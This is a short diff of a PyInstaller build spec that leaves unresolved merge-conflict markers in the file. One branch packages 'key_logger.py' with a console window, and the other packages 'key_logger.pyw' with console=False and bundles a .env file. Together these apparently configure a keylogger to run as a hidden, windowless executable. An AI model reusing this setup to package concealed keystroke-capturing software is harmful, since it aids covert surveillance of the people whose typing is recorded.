@@ -2,7 +2,11 @@
 
 
 a = Analysis(
+<<<<<<< HEAD
     ['key_logger.py'],
+=======
+    ['key_logger.pyw'],
+>>>>>>> 9fe2ee77a053c99aefda04af90accce2fd7d77fb
     pathex=[],
     binaries=[],
     datas=[('.env', '.')],
@@ -29,7 +33,11 @@ exe = EXE(
     upx=True,
     upx_exclude=[],
     runtime_tmpdir=None,
+<<<<<<< HEAD
     console=True,
+=======
+    console=False,
+>>>>>>> 9fe2ee77a053c99aefda04af90accce2fd7d77fb
     disable_windowed_traceback=False,
     argv_emulation=False,
     target_arch=None,
